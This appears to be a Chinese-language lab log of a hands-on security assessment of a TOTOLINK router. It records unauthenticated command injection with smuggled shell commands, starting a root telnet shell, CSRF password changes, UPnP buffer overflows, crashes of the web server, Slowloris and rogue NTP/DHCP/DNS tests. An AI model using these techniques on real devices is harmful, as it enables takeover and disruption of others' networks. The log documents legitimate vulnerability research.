這一步燒掉了什麼: 一次開機循環（本場第 3 次）
驗證狀態(測後): dynamic   下一步: A3.2.4
⚠️ 那個 `FAIL Kernel command line` 是預期的：A1.3.2 解出的 kernel 裡沒有那個字串。

T-47  P2-11  開機後的 IP session 視窗（A3.2.4）             2026-08-18 19:49–20:20
可行性: ★★★   驗證狀態(測前): static   依據: notes/auth-session-ip.md
送出（逐字）: bash tools/session-window.sh --host 10.1.1.1 --page /password.htm
              --src-a 10.1.1.100 --src-b 10.1.1.101 --kernel-t0 <t> --until 800 --interval 10
原始回應（第一個錨，登入於 uptime 232.9）:
      uptime    A      B
      232.9     200    302
      602.6     200    302     ← 預測說這裡該是 302
      809.3     200    302
      883.6     302    302
原始回應（第二個錨，登入於 uptime 939.5，已超過 601）:
      before login  uptime 939.4  A=302 B=302
      LOGIN         uptime 939.5  -> 200      預測翻面點 1540.5
      1538.1    200    302
      1541.2    302    302     ← 落在 [1538.1, 1541.2]
觀測通道 1（第二來源位址）: B 在全部 60 餘格都是 302，所以不是伺服器掛掉
觀測通道 2（機制）: 第二次登入在 uptime 939 重開了視窗，而預測的機制禁止這件事
判定: 🔶 部分
反證檢查: 測前寫「(a) 第 3 步在 601 秒內就回 302 → 這條臂從來不成立」——沒有觸發，
          臂成立；「(b) uptime 超過 601 之後仍然回 200 → `beforeuptime` 有一個寫入點，
          而 Ghidra 與 tools/mipsref.py 同時漏掉同一個寫，那是儀器問題」——**觸發**
這一步燒掉了什麼: 沒有。全部是 GET 加一次 form 登入
驗證狀態(測後): dynamic   下一步: 修儀器，然後才談這一列
🔴 **第一版的程序用 HTTP Basic 的 GET 當「登入」，量到 302，差一點寫成「這條臂是死的」。**
   寫 `authipaddr` 的是 `form_formLogin`，Basic 認證走的是另一條路徑。改成 POST
   `/boafrm/formLogin`（`username` / `userpass`）之後，臂立刻成立。**假陰性是自己造的。**
🔴 **兩個錨點差 706 秒，都落在 login+601。** 這不是量到一個數字，是把兩個互斥的機制
   假設分開，而分開它們的是第二個錨點的存在。
★ 線索（來自 mipsref 報告自己的輸出，不是新量測）：同一份報告把 `authipaddr`
  （`0x00486270`）報成 6 讀 0 寫，而 note 說它由 `form_formLogin` 在 `0x0044f13c` 寫 ——
  那個寫是 `strcpy`，位址當參數傳進去，不是 `sw`。**「真的被寫的全域回報 writes:false」
  在那支掃描器自己的輸出裡已經發生過一次。**

T-48  P9-4   loader 不上網路（第二次獨立冷開機）            2026-08-18 19:45
可行性: ★★★★   驗證狀態(測前): unverified   依據: T-45
送出: 什麼都沒送。tcpdump 在通電前架好；序列埠這次是開著的但**只讀不送**
原始回應: `udp.port==69 || tftp` 全場 0 個；裝置在 Linux 起來之前送出 0 個 frame
判定: ✅ 成立（兩次獨立冷開機，兩種不同的序列埠設置）
反證檢查: 測前寫「被動錄到 loader 送 ARP 或 TFTP，而全程沒有碰序列埠 → 嚴重度整個上調」，
          兩次都沒有觸發
這一步燒掉了什麼: 沒有
驗證狀態(測後): dynamic   下一步: 無
★ 循環 2 是**連 port 都沒開**，循環 3 是**開著但只讀**。兩種不同設置給同一個答案，
  比同一個設置做兩次強。

T-49  P6-4 P6-6 P6-7 P6-8 P6-12  UDP / TCP 偵察那一輪（A3.14）  2026-08-18 20:03
可行性: ★★★★★   驗證狀態(測前): unverified / other-build   依據: P1-2
送出（逐字）: sudo nmap -sU -p 53,161,1900,5060,9034,9999,20005 -sV --version-intensity 2 10.1.1.1
              sudo nmap -sT -p 5555,7547 10.1.1.1
原始回應:
      53/udp closed  161/udp closed  1900/udp open|filtered  5060/udp closed
      9034/udp closed  9999/udp closed  20005/udp closed
      5555/tcp closed  7547/tcp closed
觀測通道 1（掃描前後的對照組）: boa 200 / 200
觀測通道 2（rootfs）: /bin/UDPserver ABSENT、/bin/skt ABSENT（rcS 仍有 `#skt&`）、
      cwmpClient **整個映像裡不存在**，而 rcS 22–27 行仍然建 /var/cwmp_default 與 /var/cwmp_config
觀測通道 3（正對照）: nmap broadcast-dhcp-discover 收到完整 DHCPOFFER（offered 10.1.1.10，
      server identifier 10.1.1.1，domain name TOTOLINK）
判定: P6-4 ✅ · P6-6 ✅ · P6-7 ❌（預測前提是錯的）· P6-8 ✅ · P6-12 ✅
反證檢查: 測前寫「任一個 UDP 埠有回應 → rootfs 的 ELF 清單漏了東西」，
          實際看到七個 UDP 埠與兩個 TCP 埠全部無回應，而 `/bin/UDPserver` 與 `/bin/skt`
          在 rootfs 裡也確實不存在，兩個來源一致。
          測前另外寫「**沒有正對照的『全關』不算數**：同一輪裡必須有一個已知開著的
          UDP 埠（1900 或 53）回應」，**實際看到那兩個指定的埠都沒有回應**（1900 的
          `open|filtered` 在 UDP 語意裡就是沒收到回應），所以正對照改用
          `broadcast-dhcp-discover` 收到的完整 DHCPOFFER —— 那是一次應用層往返，
          比登記簿要求的「有回應」更強，而這個替換寫在這裡而不是默默通過
這一步燒掉了什麼: 沒有
驗證狀態(測後): dynamic   下一步: P6-7 的預測要改
🔴 **`1900/udp` 的 `open|filtered` 是假陰性，而我差一點拿它當「UPnP 不存在」的證據。**
   nmap 的預設 SSDP 探測用 `ST: ssdp:all`，而這台**不回答 `ssdp:all`**（那本身違反規範）。
   換成三個具體的 ST 之後它全部回答 —— 見 T-50。

T-50  P6-1 P6-2 P8-7  兩個 UPnP 堆疊，而旗標只關掉一個       2026-08-18 20:35–20:52
可行性: ★★★★   驗證狀態(測前): unverified   依據: P1-10
送出（逐字）: 四個具體 ST 的 SSDP M-SEARCH；GET :52881/simplecfgservice.xml；
              然後 `upnp:rootdevice` + N 個 'A' 的前綴匹配階梯
原始回應:
      ST urn:schemas-wifialliance-org:device:WFADevice:1       -> 200 OK 289B
      ST urn:schemas-wifialliance-org:service:WFAWLANConfig:1  -> 200 OK 299B
      ST upnp:rootdevice                                       -> 200 OK 225B
      ST urn:schemas-upnp-org:device:InternetGatewayDevice:1   -> (no reply)
      Server: OS 1.0 UPnP/1.0 Realtek/V1.3
      Location: http://10.1.1.1:52881/simplecfg.xml
      GET :52881/simplecfgservice.xml -> 200, 6199 bytes
      ST 總長  15 -> 225B(echo 15)   23 -> 241B(23)   47 -> 289B(47)
              79 -> 353B(79)        143 -> 481B(143)  271 -> 737B(271) 然後死
      console: do_page_fault() #2: sending SIGSEGV to wscd for invalid read access
               from 4187c8bc (epc == 2aae1f38, ra == 2aae1e64)
觀測通道 1（活設定）: UPNP_ENABLED = 0；52869/tcp closed；52881/tcp open
觀測通道 2（web UI）: menu.htm 的 31 頁裡**沒有任何一頁是 UPnP**
判定: P6-1 ⬛ 不適用 · P8-7 ⬛ 不適用 · **P6-2 ✅ 成立**
反證檢查: P6-1 測前寫「P1-10 顯示 1900 無回應 → 整組收掉」——**沒有觸發**，1900 有回應，
          只是回答的是 wscd 不是 miniigd；缺席的是 IGD 不是 UPnP。
          P6-2 測前寫「超長 ST 正常回應或被截斷 → 有長度檢查，收掉」——沒有觸發，
          它回應了、回應長度隨輸入線性成長、然後行程死掉
這一步燒掉了什麼: wscd 一個行程（boa 全程 200）
驗證狀態(測後): dynamic   下一步: UPNP_ENABLED 要從第 2 站寫回 1 才談得了 P6-1 / P8-7
🔴 **第一個 ST 階梯什麼都沒測到，而它看起來像有測到。** 不匹配的 ST 一律無回應，
   那跟「有長度檢查」長得一模一樣。**要先讓 ST 匹配，複製才會發生** —— 而匹配是
   **前綴匹配**，所以合法 ST 加填充同時滿足兩者。
★ **崩潰位址是 `4187c8bc` 不是 `41414141`。** 一個活指標的最高位元組被填充的 `'A'`
  蓋掉，其餘三個是原值 —— 那是部分指標覆寫，溢位剛好只越過一個 byte。
```

```text
T-51  P8-17  線上的明文憑證（A3.21 前半）                    2026-08-18 21:0x
可行性: ★★★★★   驗證狀態(測前): unverified   依據: 管理介面純 HTTP
送出: 什麼都沒送。從循環 3 全程錄的 pcap（3,963 個封包）裡取
原始回應:
      http.authorization : Basic YWRtaW46YWRtaW4=   -> base64 解出 admin:admin
      formLogin POST body: username, userpass, submit-url = admin, admin, /index.htm（出現 3 次）
      tls packets: 0        tcp/443: 0
判定: ✅ 成立
反證檢查: 測前寫「抓到的封包裡密碼不是明文 → 有某種前端雜湊，那要回去讀 w6cg 裡的 JS」，
          實際登入表單的 `userpass` 是逐字明文，連編碼都沒有，沒有雜湊可找
這一步燒掉了什麼: 沒有。純被動
驗證狀態(測後): dynamic   下一步: 無
⚠️ **範圍：ARP MITM 本身沒有做。** 這是一條點對點鏈路，沒有第三方可以被重導。
   量到的是前提（憑證對網段上任何東西可讀），交付機制在有其他 client 的交換式 LAN
   上才是 ARP spoofing，那一半未測。

T-52  P8-20  iwpriv 私有 ioctl 盤點（A3.21 後半）             2026-08-18 21:1x
可行性: ★★★★   驗證狀態(測前): unverified   依據: /bin/iwpriv 在映像裡
送出（逐字）: 透過 formSysCmd 的 docroot oracle：`iwpriv wlan0 > /var/web/iwpriv0.txt;#`
原始回應（46 個私有 ioctl，開頭這幾個是重點）:
      set_mib (89F1)  get_mib (89F2)   write_reg (89F3)  read_reg (89F4)
      write_mem (89F5) read_mem (89F6) write_eeprom (89F8) read_eeprom (89F9)
      write_bb (89FA) read_bb (89FB)   write_rf (89FC)   read_rf (89FD)
      reg_dump (8B78) copy_mib (8B79)  radio_off (8B8E)  mp_* 一整族
判定: ✅ 成立
反證檢查: 測前寫「iwpriv 對這顆驅動沒有私有命令 → 這條收掉」，
          實際 46 個，含任意記憶體讀寫與 EEPROM 讀寫
這一步燒掉了什麼: 沒有。只列清單
驗證狀態(測後): dynamic   下一步: 無
🔴 **預測低估了可達性。** 它寫「拿到 shell 之後可以直接對驅動下私有 ioctl」，
   但 `P3-3` 的未認證命令注入在這台已經是 dynamic，**所以這 46 個不需要先拿 shell**。
❌ **`write_eeprom` 與 `write_mem` 沒有被呼叫。** 盤點這個面是這一項測試，
   使用它是另一回事而且不可逆 —— `H601` 是這台獨有的 MAC 與射頻校準，reset 也不還原。

T-53  P2-10  登入計時預言（A3.22 後半）                       2026-08-18 21:2x
可行性: ★★★   驗證狀態(測前): unverified   依據: 明文 strcmp
送出（逐字）: 1000 發 GET /password.htm，5 類各 200 發，交錯送出讓抖動平均分佈
原始回應（中位數 / ms）:
      correct 15.50 · nouser 13.34 · wrongpw_long 13.53 · wrongpw_short 13.50 · wronguser 11.17
判定: 🔶 部分
反證檢查: 測前寫「1000 次取樣的分佈重疊 → 方法在這條鏈路上沒有解析度，
          記為方法限制而不是『沒有時間差』」，**實際半個觸發**：
          p10–p90 大量重疊（wronguser 5.64–12.60 對 wrongpw_short 7.06–14.56），
          所以單一取樣分不出來；但中位數差 2.33 ms，標準誤約 0.28 ms，那是 8 個標準誤
這一步燒掉了什麼: 沒有
驗證狀態(測後): dynamic   下一步: 無
🔴 **`correct` 最慢是假訊號**：它回 200 帶 5,332 bytes，其餘回 302 帶 132 bytes。
   那是傳輸量。**把它讀成比對時間，正是這一列存在要避免的錯誤。**
★ **預測的機制沒量到，一個沒被預測的量到了。** 密碼長度 1 對 32 差 0.03 ms（雜訊）；
  分開的是**階段**——帳號比對先失敗，密碼比對就沒跑。那是帳號列舉 oracle 不是密碼 oracle。

T-54  P1-11  無線指紋（A3.22 前半）                           2026-08-18 21:3x
可行性: ★★★★   驗證狀態(測前): unverified   依據: RTL8188ER
送出: 快照解碼 + 對執行中裝置取頁面
原始回應:
      WLAN_BAND2G5G_SELECT = 0
      wlbasic.htm : Band[wlan_idx] = 11  (0b1011 = B|G|N，無 A 無 AC)
      status.htm  : channel_drv[0] = '6'
      /proc/net/dev : wlan0 · wlan0-wds0 · wlan0-wds1（只有一個 radio）
      wlsecurity.htm 提供的模式：wep / wpa / wpa2，psk 或 eap，tkip 或 aes
      WSC_DISABLE = 0
判定: 🔶 部分
反證檢查: 測前寫「掃到 5 GHz 或 SAE → 硬體判定錯誤，E-8 的排除理由不成立」，
          實際四個裝置側來源一致指向 2.4 GHz b/g/n，而韌體自己的 UI 裡沒有
          WPA3 / SAE / OWE 任何一個字。**但空中掃描沒有做**，而反證條件要求的
          動作正是掃描，所以這一列停在 partial 而不是成立
這一步燒掉了什麼: 沒有
驗證狀態(測後): unverified -> partial   下一步: 需要一次頻譜量測當獨立來源
⚠️ 主機的 Wi-Fi 掃描要 Windows 定位權限加系統管理員權限，今晚沒有為它改系統設定。
   上面全部是**裝置在描述它自己**，那不是獨立來源。

T-55  P8-14  以 formSysCmd 掃內網（A3.20 前半）               2026-08-18 21:4x
可行性: ★★★★   驗證狀態(測前): unverified   依據: P3-3 · P8-15
送出（逐字）: docroot oracle 送 `ping -c 2 -W 2 10.1.1.100` 與 `... 10.1.1.77`；
              以及 `wget -T n -O - http://10.1.1.100:{9999,9}/ 2>&1; echo rc=$?`
原始回應:
      10.1.1.100 : 4 packets transmitted, 4 packets received, 0% packet loss
      10.1.1.77  : 4 packets transmitted, 0 packets received, 100% packet loss
      wget :9999（我方 listener 開著）-> rc=0        wget :9（關閉）-> rc=1
判定: ✅ 成立
反證檢查: 測前寫「ping 或 wget 在裝置上跑得起來卻沒有可觀測的回傳差異 →
          P8-15 的命令盤點漏掉了『存在』與『可用』的差別」，
          實際兩個 oracle 都有乾淨的二元差異，兩者都可用
這一步燒掉了什麼: 沒有
驗證狀態(測後): dynamic   下一步: 無
⚠️ 兩個方法限制，而它們是限制不是失敗：多敘述的 shell 迴圈（`for h in …; do … done`）
   回 boa 的 302 而且沒有產出檔案，**所以 docroot oracle 一次吃一條命令不吃腳本**；
   而 busybox 的 `ping -c 2` 送四發，不影響 up/down 判別但封包數不是要求的那個。
```

## 二、`A3.23` 的兩發順序反了，而 runsheet 沒有寫

作業單把它們編成「1. `formSchedule` 缺 `webpage`」「2. 另外抽 2–3 個」。
**第一發是終局的**——`boa` 消失而且不會自己回來——而第二發需要 `boa` 活著。
所以**第二發必須先打**，否則它根本打不成。今晚就是這樣跑的，而 runsheet 要改。

## 三、崩潰測試之前要先開第二條路

`A3.23` 第一發之後 console 印了 `caught SIGSEGV, dumping core in /tmp`，
**而那份 core 拿不回來**：`boa` 是唯一的入口、`/tmp` 是 tmpfs（重開就沒）、
序列埠會回顯但不回應（沒有 shell）。

**修法是一行**：開火之前先用命令注入把 `telnetd -l /bin/sh` 起來。
本場後半立刻套用了，而它在 `P6-3` 那一節直接救了場——`wscd` 卡住之後，
是 telnet 進去才發現「行程還活著、只是 listener 關了」，而那個區別是整條發現的核心。

```text
T-56  P8-3 P8-4  CSRF：來源檢查有沒有，以及跨站改密碼（A3.17）  2026-08-18 21:5x
可行性: ★★★★★   驗證狀態(測前): unverified   依據: P2-1 · P10-3
送出（逐字）: 同一發 POST /boafrm/formSysCmd 四種送法（裸 / 帶 Origin / 帶 Referer / 兩者都帶）；
              然後 POST /boafrm/formPasswordSetup 帶外部 Origin 與 Referer、
              **不帶 Cusername 與 Cpassword**，把密碼改成一個暫時值
原始回應:
      plain 302 133 · with-origin 302 133 · with-referer 302 133 · both 302 133
      formPasswordSetup 302 135
      改之前：原憑證 200、暫時憑證 302   改之後：原憑證 302、暫時憑證 200
      formLogin 帶暫時憑證 -> 200
判定: P8-3 ✅ · P8-4 ✅
反證檢查: P8-3 測前寫「存在任何 token 或 Referer 檢查 → 前提不成立」，
          實際四種送法回應逐 byte 相同，路徑上沒有任何來源檢查。
          P8-4 測前寫「密碼改掉了但新密碼登不進去 → 寫進 MIB 的欄位與登入路徑
          讀的欄位不是同一個」，實際新密碼從 form_formLogin 也通得過，沒有觸發
這一步燒掉了什麼: 管理密碼改一次，同一支腳本內還原並三向驗證
驗證狀態(測後): dynamic   下一步: 無
🔴 **還原的驗證差一點被今晚自己量到的另一條缺陷騙過去。** 從 `.100` 看，還原之後
   「原密碼和暫時密碼都通」——不可能。因為 `.100` 剛打過 `formLogin`，`P2-11` 的
   IP session 對它開著，**它送什麼都回 200**：原密碼、暫時密碼、亂填的、完全不帶，四個都是 200。
   從**從未登入過的 `.101`** 看才是 200 / 302 / 302 / 302，而 flash 自己說
   `USER_PASSWORD="admin"`。**任何從已登入位址做的憑證驗證都量不到東西。**

T-57  P8-2 P6-9  儲存型注入的 sink，與 DNS relay 的身分（A3.19 · A3.16）  2026-08-18 22:0x
可行性: ★★★   驗證狀態(測前): unverified   依據: P8-1 · 三支候選 binary
送出（逐字）: 帶標記的失敗登入（username 與 User-Agent 都放標記）→ 讀 syslog.htm；
              手工組的 DNS 查詢（version.bind CH TXT 與 example.com IN A）送 10.1.1.1:53
原始回應:
      syslog.htm : <textarea rows="30" name="msg" cols="95" wrap="virtual"></textarea>  ← 空的
      /bin/syslogd 在映像裡；ps 裡 0 個；/var/log 是空的；/var/log/messages 不存在
      兩發 DNS 查詢都 timeout；ps 裡沒有 dnrd / dnsmasq / dns_protocl / dnsspoof
      sysconf 字串：/var/run/dnrd.pid · killall -9 dnrd · "dnrd cmd in start_wanphy_dnrd %d = %s"
判定: 兩條都 🔶 部分
反證檢查: P8-2 測前寫「模板做了輸出編碼 → 整組收掉」與「模板沒編碼但值被截斷或消失
          → 過濾在寫入端」，**實際兩個分支都不適用**：標記沒有被編碼也沒有被截斷，
          log 裡什麼都沒有，因為 syslogd 沒在跑——sink 不存在，而我不會把它硬塞進其中一支。
          P6-9 測前寫「不回應版本查詢也不吐錯誤 → 換白盒，直接讀那支 binary」，
          實際兩發都沒有回應，於是照它說的換白盒，答案是 dnrd 由 sysconf 在 WAN phy 路徑上啟動
這一步燒掉了什麼: 沒有
驗證狀態(測後): dynamic   下一步: P8-2 的另外兩個欄位要 miniigd 與 WAN 側 PPPoE
★ 四支候選全部在映像裡：dnrd 50,684 · dnsmasq 113,856 · dns_protocl 4,284 · dnsspoof 3,820。
  **`dns_protocl` 沒有任何東西提到它。**

T-58  P8-11  假 NTP，以及一個做壞的封包做對的事（A3.18）      2026-08-18 22:3x
可行性: ★★★   驗證狀態(測前): unverified   依據: /bin/ntp_inet 在 ps 裡
送出（逐字）: 主機 udp/123 起假 NTP；命令注入 `killall ntp_inet; ntp_inet -x 10.1.1.100 &`
原始回應:
      >>> NTP REQUEST 1 from 10.1.1.1:36188  48B  li_vn_mode=0x1b
      pcap: 10.1.1.1 → 10.1.1.100 NTP Version 3, client（明文）
      回 44 byte（少 4 個，tshark 標 Malformed）-> device date = Thu Feb  7 14:28:56 GMT 2036
      回 48 byte（正確，編碼 2026-08-18 12:42:41 UTC）-> device date = Tue Aug 18 20:42:47 GMT 2026
判定: ✅ 成立
反證檢查: 測前寫「隔離網段上抓不到任何 NTP 或 DDNS 的對外請求 → 這些 client 沒有被
          啟動，或觸發條件不是『WAN 連上』。那時要先答出誰啟動它們、條件是什麼」，
          實際抓到了完整的 NTP v3 明文請求；而啟動者也答出來了：
          /bin/ntp.sh 一行 `sysconf ntp $*`，sysconf 帶 start_ntp / ntp_inet / ntpclient，
          在 ps 裡的 timelycheck 也引用 ntp_inet，是週期性再同步的驅動者
這一步燒掉了什麼: 裝置時鐘（無 RTC，重開即失）
驗證狀態(測後): dynamic   下一步: DDNS 那一半未做
🔴 **2036-02-07 是 32-bit NTP 時間戳的最大值 `0xFFFFFFFF`**，而那個值**不在我送出去的
   資料裡**——我封包的 bytes 40–43 是零，44–47 根本不存在。**這台的 NTP client 讀了
   一個短 datagram 尾端之外的東西。** 正確的 48 byte 回應設出正確的時間，兩點加對照。
   **這是行為觀察不是根因**：`/bin/ntp_inet` 沒有被讀過。
⚠️ 網頁表單那條路不落地：`ntpServerId=0` 配 `ntpServerIp1` 與 `=1` 配 `ntpServerIp2`
   都回 200，而 `NTP_SERVER_IP1` 仍是原值、`NTP_SERVER_IP2` 仍是空的。

T-59  P8-16  Slowloris，以及一個永遠回 0 的檔案（A3.20 後半）  2026-08-18 23:2x
可行性: ★★★★   驗證狀態(測前): unverified   依據: Boa 0.94 單行程 select()
送出（逐字）: 250 條半開連線（送到標頭中途、不送結尾 CRLF），逐段量管理介面
原始回應:
      idle est=1 · held 50 est=51 · 100 est=101 · 150 est=151 · 200 est=201 · 250 est=251
      管理介面每一格都是 200；再握 20 秒仍是 251 / 200；放掉之後 est=1 / 200
      /var/boa.conf : KeepAliveMax 0 · KeepAliveTimeout 10
判定: ❌ 不成立
反證檢查: 測前寫「連線數拉到上限而管理介面照常回應 → 這個 build 不是單行程模型，
          boa 的連線處理要回頭讀」，**實際 251 條同時掛著而管理介面全程 200**，觸發
這一步燒掉了什麼: 沒有
驗證狀態(測後): dynamic   下一步: 照反證條件，回去讀 boa 的連線處理
🔴 **第一次的計數是儀器失效，而它會給出相反的結論。** 用 `/proc/net/tcp` 數，
   握著 200 條的時候回報 port 80 上 **0 條**——因為 **`boa` 綁在 dual-stack IPv6 socket 上**，
   IPv4 client 以 `::ffff:` 映射位址出現在 `/proc/net/tcp6`。同一份檔案稍早也沒把
   port 80 列成 LISTEN，而當時伺服器正在回應——**那個「不可能」才是去查第二次的理由**。

T-60  P1-7 P5-6  兩份桌面清單拿到矽上（A3.23）                2026-08-18 23:4x–00:0x
可行性: ★★★★   驗證狀態(測前): emulated   依據: notes/emulation-2018.md
送出（逐字）: 先第二發：對 formNtp / formDMZ / formWlanSetup 送空 body POST；
              再第一發：POST /boafrm/formSchedule 帶 submit-url、**缺 webpage**；
              另外對 8 個工廠測試名與 4 個負對照送 POST，讀 302 的目的地
原始回應:
      formNtp 200(4.42 s) · formDMZ 200(4.50 s) · formWlanSetup 200(10.3 s)，boa 全程活著
      formSchedule -> 000，之後 40 秒每 5 秒量一次全是 000
      console: do_page_fault() #2: sending SIGSEGV to boa for invalid write access to
               004725d0 (epc == 2aafe218, ra == 00445974)
               caught SIGSEGV, dumping core in /tmp
      八個工廠名全部 404；formNoSuchThing / zzzz 也是 404；
      /goform/* 與 /cgi-bin/* 回 400；正對照 formNtp 回 302 Location: http://10.1.1.1/index.htm
判定: P5-6 ✅ · P1-7 ✅
反證檢查: P5-6 測前寫「模擬下的崩潰在實體機上重現不了 → 模擬環境的結論不能外推」，
          實際在**同一個位址** 004725d0 重現，沒有觸發。
          P1-7 測前寫「字典掃出 root_form[] 以外的可達路徑 → dispatch 不只一張表」，
          實際八個名字與負對照逐字相同都是 404，沒有觸發
這一步燒掉了什麼: boa 一個行程（要斷電重開）；/tmp 的 core dump 無法取回
驗證狀態(測後): dynamic   下一步: 見本場「二、」與「三、」兩則程序修正
⚠️ **`formWlanSetup` 第一次量到 `000`，而它沒有崩，只是花了 10.3 秒。** 6 秒的
   timeout 產生的 `000` 跟崩潰長得一模一樣——今晚第二次遇到這個假陰性形狀。

T-61  P6-3  wscd 的 SUBSCRIBE，以及一個守衛設得太寬的門檻    2026-08-19 00:1x
可行性: ★★★★   驗證狀態(測前): unverified   依據: CVE-2021-35393
送出（逐字）: SUBSCRIBE /upnp/event/WFAWLANConfig1 到 :52881，CALLBACK 長度階梯
原始回應:
      控制發（短 CALLBACK） -> HTTP/1.1 200 OK · SID: uuid:… · TIMEOUT: Second-180
      總長  55 /  87 / 151 -> 200 OK，wscd alive
      總長 215 … 1047      -> 412 Precondition Failed，wscd alive
      總長 2071            -> ConnectionReset
      夾中間：160 -> 200 alive · 170 -> 200 alive · **180 -> 200，然後永遠不回應**
      console：**一行都沒有**（今晚兩次真的 fault 它都印了）
      ps：PID 455 仍在，State: S (sleeping)
      手動重啟 wscd -> "Failed to open socket for HTTP. EXITING / Error with UpnpInit -- -101"
      /proc/net/tcp6 沒有 52881 了；/proc/net/udp 的 1900 還綁著，rx_queue = 0x828（2,088 bytes 未讀）
判定: ✅ 成立
反證檢查: 測前寫「wscd 沒在跑（ps 或埠位掃描）→ 這條與 P7-4 一起收掉，
          且代表 sysconf 的啟動清單不是照旗標全開」，實際 wscd 在跑、端點可達、
          SUBSCRIBE 回 200 帶 SID，沒有觸發
這一步燒掉了什麼: wscd 的兩個網路面（行程本身還在，所以沒有東西會重啟它）
驗證狀態(測後): dynamic   下一步: 是不是 CVE-2021-35393 的同一個機制，行為證據答不了
🔴 **「有長度檢查所以安全」是我第一版的結論，而它是錯的。** 215 以上被擋回 412，
   但 180 過得了檢查而且會溢位——**守衛的門檻設在緩衝區上面**，致命窗口在兩者之間。
   **只測門檻以外，會把服務報成受保護的。**
🔴 **這不是崩潰，是卡住，而三個來源同意**：console 無 fault、ps 有行程且 sleeping、
   socket 還被握著所以別的東西接不了手。**行程沒結束，所以沒有任何機制會重啟它。**
```

```text
T-62  P8-19 P6-5  WAN 側：一份租約，以及一條被自己弄斷的鏈    2026-08-19 00:4x–02:1x
可行性: ★★★   驗證狀態(測前): unverified   依據: WAN_DHCP=1 · udhcpc 在 ps 裡
送出（逐字）: 網卡從 LAN 埠改插 WAN 埠；主機 192.168.77.1/24；自寫的 DHCP 伺服器
原始回應（第一次，完整開機 + 160 秒）:
      packets handled: 0        線上總封包數: 0        rx_packets 完全沒動
      10.1.1.1 靜默、ARP FAILED（所以線不是插在 LAN 埠）
      ifconfig eth1 -> MTU:0     ifconfig eth0 -> MTU:1500
      flash get DHCP_MTU_SIZE -> 0
原始回應（第二次，**唯一改動是 `ifconfig eth1 mtu 1500` 加 `kill -USR1 270`**）:
      1  0.000000  0.0.0.0 → 255.255.255.255  DHCP Discover
      2  0.000501  192.168.77.1 → …           DHCP Offer
      3  0.009908  0.0.0.0 → …                DHCP Request
      4  0.010404  192.168.77.1 → …           DHCP ACK
      5  4.022744  裝置 → Broadcast           ARP Who has 192.168.77.1?
      7  4.026116  192.168.77.100 → 118.163.81.61  NTP Version 3, client
      8  4.175977  192.168.77.100 → 192.168.77.1   DNS query A hopeiot.net
      requested options: 1,33,121,249,3,6,12,15,28,44,46,47
      vendor class: udhcp 0.9.9-pre
      拔線之後：/etc/resolv.conf 仍然是 `nameserver 192.168.77.1`
判定: P8-19 ✅ · P6-5 ⬛ 不適用
反證檢查: P8-19 測前條件是能不能從 WAN 側送成並觀測；實際第一次零封包、
          第二次在**只改一個變數**之後完整四段交握，所以「WAN 打不到」與
          「WAN 被弄壞了」被分開了。
          P6-5 測前寫「需從 WAN 側送」；實際 ALG_SIP_ENABLED=0、
          nf_conntrack_expect 空、沒有 SIP helper，**標的不存在**，
          而關掉它的是 W05 自己那一輪 POST（紀錄裡的 `ALG_SIP_ENABLED 1 -> 0`）
這一步燒掉了什麼: eth1 的 MTU 被手動改成 1500（只在 RAM，重開即回 0）；
          裝置拿了一份我方的 DHCP 租約，`/etc/resolv.conf` 被換成我方位址
驗證狀態(測後): dynamic   下一步: 路由注入（opt 33/121/249）未送成
🔴 **這是今晚影響最大的一條，而它是找別的東西時撞到的。**
   W05 那一輪未認證、參數缺席的 POST 把 `DHCP_MTU_SIZE` 從 1500 寫成 0，
   **這台的 WAN 介面從那天起就以 MTU 0 開機、送不出任何東西、拿不到 WAN 位址**——
   而那寫在 flash 裡，跨越所有重開機。W05 那一格的結論是
   「改掉的欄位，沒有一個往危險的方向走」。**一個未認證請求造成的持久性 WAN DoS。**
⚠️ 路由注入沒有送成：租約 3600 秒還活著，逼它續約要 LAN 側的 telnet，
   而那與網卡插在 WAN 埠互斥。**它宣告接受 33 / 121 / 249，但本場沒有實際送。**

T-63  P6-10  WAN 一斷，dnsspoof 就接管整個網段                2026-08-19 02:2x
可行性: ★★★   驗證狀態(測前): unverified   依據: /bin/dnsspoof 在映像裡
送出（逐字）: 觸發是自然產生的——裝置持有真實 DHCP 租約，然後 WAN 線被拔掉；
              之後從 10.1.1.100 送四個名字的 A 查詢與一發 version.bind CH TXT
原始回應:
      ps  : 1315 root 696 S  dnsspoof 10.1.1.1
      /proc/net/udp : 53 綁著（本場稍早每一次量都是關的）
      example.com                         -> A = 10.1.1.1
      www.google.com                      -> A = 10.1.1.1
      hopeiot.net                         -> A = 10.1.1.1
      this-name-does-not-exist-zz.invalid -> A = 10.1.1.1
      version.bind CH TXT                 -> no reply
      /var/info : dnrd cmd in start_wanphy_dnrd 3 = 192.168.77.1
      /var/wan_phy : interface eth1 / ip 192.168.77.100 / router 192.168.77.1 / nameserver 192.168.77.1
判定: ✅ 成立
反證檢查: 測前寫「拔掉 WAN 後 DNS 行為完全不變 → 那段程式沒有被走到，或觸發條件
          不是斷線。先確認在聽的到底是三支中的哪一支，再談行為」，
          實際 dnsspoof 起來了、53 綁上了、每一個名字都被劫持，而在聽的那一支
          從 ps 直接讀得出來
這一步燒掉了什麼: 沒有（狀態是前一項留下的）
驗證狀態(測後): dynamic   下一步: 無
★ **連一個不存在的 TLD 都回 10.1.1.1**，所以是全域萬用字元不是解析失敗的後備。
★ **`/var/info` 把 P8-19 的鏈在行程層級補完**：WAN 側 DHCP 給的 DNS 選項，
  直接成為 LAN 端 relay `dnrd` 的 `-s` 上游參數。
🔴 **三段複合，全部是今晚量到的**：一發未認證 POST 讓 WAN 永久不能用 →
  WAN 斷線讓 dnsspoof 起來 → 每一個 LAN client 的每一次查詢都指向 10.1.1.1，
  而那台正是帶著未認證命令注入（`P3-3`）、未初始化憑證對（`P2-9`）、
  未認證改密碼（`P10-3`）的 web 伺服器。**重開機不會清掉它。**
```

## 這一場燒掉了什麼

- **開機循環 5 次**：第 2 站 1 次、第 3 站 boot1 / boot2、`A3.23` 打死 `boa` 之後 1 次、
  第二次 WAN 嘗試前 1 次。
- **`boa` 被打掉 1 次**（`formSchedule` 缺 `webpage`，`A3.23` 第一發，不可自癒）。
- **`wscd` 被打掉 2 次**：一次 SIGSEGV（`P6-2`，SSDP `ST`），一次卡死不崩（`P6-3`，SUBSCRIBE）。
- **管理密碼改 1 次**（`P8-4`），同一支腳本內還原，並從**未登入過的第二個來源位址**
  加 flash 兩個來源驗證。
- **`/etc/resolv.conf` 被換成 `192.168.77.1`**（我方的假 DNS），拔線後仍在。
- **`eth1` 的 MTU 被手動設成 1500**（只在 RAM）。
